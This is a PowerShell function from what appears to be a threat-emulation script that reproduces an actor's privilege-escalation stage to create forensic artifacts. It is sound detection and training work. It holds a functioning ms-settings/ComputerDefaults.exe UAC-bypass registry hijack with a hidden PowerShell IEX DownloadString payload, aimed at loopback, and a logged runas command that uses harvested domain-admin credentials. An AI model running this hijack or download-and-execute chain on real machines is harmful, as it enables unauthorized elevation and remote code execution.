# ============================================================================
# LUNAR SPIDER SIMULATION - PHASE 4: PRIVILEGE ESCALATION
# ============================================================================
# Simulates: (1) runas via the Secondary Logon service using domain-admin creds
# recovered from unattend.xml, spawning gpupdate.exe under the admin context;
# (2) UAC bypass via the ms-settings protocol-handler hijack invoked by the
# trusted ComputerDefaults.exe auto-elevate binary.
# MITRE: T1548.002 Bypass UAC, T1134 Access Token Manipulation,
# T1078.002 Domain Accounts, T1546.015 (COM/handler hijack pattern)
# ============================================================================

function Simulate-PrivilegeEscalation {
    param($SimPaths)

    Write-Host "[+] Phase 4: Privilege Escalation - runas + UAC bypass ..." -ForegroundColor Green

    # --- runas via Secondary Logon (seclogon) -> gpupdate.exe -----------------
    # Ensure the Secondary Logon service is running, as the actor relied on it.
    try {
        Set-Service -Name seclogon -StartupType Manual -ErrorAction SilentlyContinue
        Start-Service -Name seclogon -ErrorAction SilentlyContinue
    } catch {}

    # Record the technique; the real actor ran runas with the domain-admin creds
    # pulled from unattend.xml (see Phase 6) and spawned gpupdate.exe. We spawn a
    # benign gpupdate.exe locally for the authentic process-tree/Prefetch artifact.
    $runasLog = "runas /user:CORP\Administrator gpupdate.exe  (creds sourced from unattend.xml)"
    Set-Content -Path "$($SimPaths.Logs)\runas_seclogon.log" -Value $runasLog -Force
    try {
        Start-Process -FilePath "$env:SystemRoot\System32\gpupdate.exe" -ArgumentList "/target:computer" `
            -WindowStyle Hidden -ErrorAction SilentlyContinue
    } catch {}
    Write-SimEvent -EventId 4001 -Message "SIMULATION: runas via Secondary Logon spawned gpupdate.exe under domain-admin context (creds from unattend.xml)"

    # --- UAC bypass: ms-settings handler hijack via ComputerDefaults.exe -------
    # The report's exact registry write (payload defanged to a local loopback URL):
    #   reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /f /d
    #     "cmd.exe /c powershell -nop -w hidden -c IEX(...DownloadString('hxxp://127.0.0.1:11664/'))"
    $msKey = "HKCU:\Software\Classes\ms-settings\shell\open\command"
    New-Item -Path $msKey -Force | Out-Null
    $uacPayload = 'cmd.exe /c powershell -nop -w hidden -c "IEX (New-Object Net.Webclient).DownloadString(''http://127.0.0.1:11664/'')"'
    Set-ItemProperty -Path $msKey -Name "(default)" -Value $uacPayload -Force
    # DelegateExecute must be empty for the hijack to fire (classic fodhelper/ComputerDefaults bypass)
    Set-ItemProperty -Path $msKey -Name "DelegateExecute" -Value "" -Force
    Write-Host "    Wrote ms-settings\shell\open\command hijack (127.0.0.1 payload, defanged)" -ForegroundColor DarkGray
    Write-SimEvent -EventId 4002 -Message "SIMULATION: UAC bypass staged via ms-settings handler hijack; ComputerDefaults.exe auto-elevate trigger"

    # Trigger the auto-elevating trusted binary so the hijack path is exercised.
    # The 127.0.0.1:11664 listener is not present, so the spawned powershell fails
    # closed - but the ComputerDefaults.exe -> cmd.exe -> powershell process tree,
    # the "System File Execution" telemetry, and the registry artifact are authentic.
    try {
        Start-Process -FilePath "$env:SystemRoot\System32\ComputerDefaults.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 2
        Get-Process -Name "ComputerDefaults" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    } catch {}

    # Clean the hijack key so we don't leave a live UAC-bypass primitive on the VM
    # after the artifact has been generated. (Comment out to leave it for triage.)
    Remove-Item -Path $msKey -Recurse -Force -ErrorAction SilentlyContinue

    Write-Host "  [OK] Privilege Escalation artifacts created" -ForegroundColor Yellow
}
